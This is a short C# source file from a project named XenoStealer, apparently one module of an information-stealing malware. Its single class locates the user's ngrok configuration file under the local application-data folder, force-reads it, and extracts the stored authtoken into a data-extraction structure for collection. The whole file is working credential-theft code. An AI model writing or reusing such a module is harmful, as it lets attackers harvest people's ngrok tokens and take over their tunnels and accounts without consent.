using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Ngrok
    {
        public static DataExtractionStructs.NgrokInfo? GetInfo()
        {
            string path = Path.Combine(Configuration.localAppData, "ngrok\\ngrok.yml");
            if (!File.Exists(path))
            {
                return null;
            }

            string fileData=Utils.ForceReadFileString(path);
            if (fileData == null) 
            {
                return null;
            }

            foreach (string i in fileData.Split(new string[] { "\r\n", "\r", "\n" }, StringSplitOptions.None)) 
            {
                if (i.ToLower().StartsWith("authtoken") && i.Contains(":") && i.IndexOf(':')<(i.Length-1)) 
                {
                    return new DataExtractionStructs.NgrokInfo(i.Split(':')[1].Trim());
                }
            }
            return null;
        }

    }
}
